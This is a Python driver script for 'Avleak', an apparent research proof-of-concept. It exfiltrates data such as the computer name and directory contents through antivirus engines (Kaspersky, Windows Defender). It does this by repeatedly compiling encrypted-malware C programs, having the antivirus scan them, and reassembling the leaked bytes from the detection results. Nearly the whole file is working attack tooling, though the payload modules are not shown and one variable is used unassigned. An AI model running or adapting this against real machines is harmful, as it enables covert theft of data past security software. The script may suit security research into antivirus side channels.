#Agent for Avleak
import argparse
import os
import shutil
from kaspersky import Kaspersky
from windows_defender import Windows_Defender
from tempfile import mkstemp
from gui import *
import timeit
   
def leak_choice():
    programs = ["Computer name", "File in dir"]
    return choice(programs, "Choose the data to leak :")

# Argument parser 
parser = argparse.ArgumentParser(description="Avleak Agent")
parser.add_argument("--malware", action='store_true', help="Flag to create new table of malwares")
parser.add_argument("-s", help="The source folder to read the malwares")
parser.add_argument("--leak", action='store_true', help="Flag to leak malwares")
parser.add_argument("--new", action='store_true', help="Flag when working on a new PC/directory")

args = parser.parse_args()

# ASCII ART AVLEAK
ascii_art()

# Ask the user for the antivirus
av_dict = {"Kaspersky": Kaspersky(), "Windows Defender": Windows_Defender()}
av_arr = []
for key in av_dict.keys():
    av_arr.append(key)
av = av_dict[choice(av_arr, "Choose the antivirus to target")]

# Prepare the tool to a new computer
if args.new:
    # Generate a new rs file
    av.generate_rs()
    
    # Remove cmake-debug content in each test scenario
    list_subfolders_with_paths = [f.path for f in os.scandir(av.program_path) if f.is_dir()]
    for subfolders in list_subfolders_with_paths:
        compile_dir = subfolders + '/cmake-build-debug'
        for filename in os.listdir(compile_dir):
            file_path = os.path.join(compile_dir, filename)
            if os.path.isfile(file_path):
                os.unlink(file_path)
            elif os.path.isdir(file_path):
                shutil.rmtree(file_path)
    
#Creation of new malware table
if args.malware:  
    if args.s is None:      
        parser.error("--malware requires -s to indicate the source file")
   

    # Check if it's an absoluth path
    if not os.path.isabs(malw_source):
        dirname = os.path.dirname(__file__)
        malw_source = os.path.join(dirname, malw_source)

    #Check if path exists
    if not os.path.exists(malw_source):
        print("Path to the av doesn't exist !")
        exit()

    #Check if it's a dir
    if not os.path.isdir(malw_source):
        print("Path given is not a directory !")
        exit()

    #Launch the scan
    av.scan(malw_source, True)
    
    #Encrypt the malwares and generate malware table
    av.generate_malware_table(True)

    #Generate new resource file so cmake relink it
    av.generate_rs()

#Leak data
if args.leak:
    data=""
    is_leaking = True
    current_byte = 0

    #Information leak
    nb_binaries = 0

    #Get the data to exfiltrate
    program = leak_choice().lower().replace(" ", "_")

    #Dir leak var
    currentDir = "C:/";
    dict_file_counter = {currentDir : 0}

    data = "";
    dataLeaked = "";

    result_file = open("result.txt", "w+")

    file_path = av.program_path + "/" + program + "/poc.c"
    compile_dir = av.program_path + "/" + program + '/cmake-build-debug'
    
    #Dir leaking logic code
    #Create temp file
    fh, abs_path = mkstemp()
    with open(fh,'w') as new_file:
        with open(file_path, 'r') as old_file:
            for line in old_file:
                if 'char* wDir' in line:
                    new_file.write('char* wDir = "%s";\n' % (currentDir))           
                else:
                    new_file.write(line)
    #Copy the file permissions from the old file to the new file
    shutil.copymode(file_path, abs_path)
    #Remove original file
    os.remove(file_path)
    #Move new file
    shutil.move(abs_path, file_path)
    
    print("Leaking...")
    
    #Performence testing
    tic=timeit.default_timer()
    bytes_ex = 0
    while is_leaking:
        #Make the program
        av.make(program, current_byte)   
        av.scan(compile_dir + "/poc.exe")
        dataLeaked = av.read()
        
        #Debug print
        print(dataLeaked)
        bytes_ex += len(dataLeaked)
        
        # Add position
        current_byte += av.byte_per_leak

        #End of leaking
        if av.end_leak_bytes in dataLeaked:
            is_leaking = False
            result_file.write(data)
            dataLeaked = dataLeaked.replace(av.end_leak_bytes, "")
            data = ""

       
        data += dataLeaked

        #Not the first time in folder
        firstTime = False
    
    #Performence analysis    
    toc=timeit.default_timer()
    print("Time needed: {} sec".format(str(toc-tic)))
    print("Bytes exfiltred: {} bytes".format(str(bytes_ex)))
    
    result_file.write(dataLeaked)
    result_file.close()
